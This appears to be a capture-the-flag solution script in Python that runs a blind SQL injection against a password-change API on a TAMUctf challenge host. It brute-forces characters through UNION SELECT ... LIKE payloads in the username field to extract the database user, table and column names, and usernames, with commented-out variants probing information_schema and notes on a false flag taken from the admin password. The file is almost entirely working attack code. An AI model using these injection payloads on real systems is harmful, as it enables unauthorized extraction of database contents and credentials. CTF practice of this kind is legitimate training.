import requests
import string
table = string.ascii_lowercase +string.digits+'{}!@#$^&*()-\|/<>;=_'

url = "http://logical.tamuctf.com/api/chpass"
# payload = "gigem{"
payload = "ro"

# data = {
#     "username": f"a' union select 1 from information_schema.columns where table_schema ='users' and table_name like '{payload}%'-- -"
# }
# req = requests.post(data=data, url=url)
# print(req.text)


while True:
    if payload.endswith('}'): break
    for letter in table:
        temp = payload + letter
        print(temp)
        data = {
            "username": f"a' union select 1 from users where current_user() like '{temp}%' -- -"
            # "username": f"a' union select username from users where username like '{temp}%' -- -"
            # "username": f"a' union select 1 from information_schema.columns where table_schema ='users' and table_name like '_sers%'-- -"  # ->
            # "username": f"a' union select 1 from information_schema.columns where column_name like '{temp}%' and table_name = 'users' -- -"
        }
        req = requests.post(data=data, url=url)
        print(req.text)
        print(payload)
        if (req.text.find('not exists')>=0 or temp.startswith('a')):
            continue
        break
    payload = temp
print("Found flag:" + payload)

# gigem{bl1nd_1nj3ct10n} false flag
        
        
        


#  users -> users -> username
#                |-> password 

# Only found one flag from admin's password, but that's false flag.
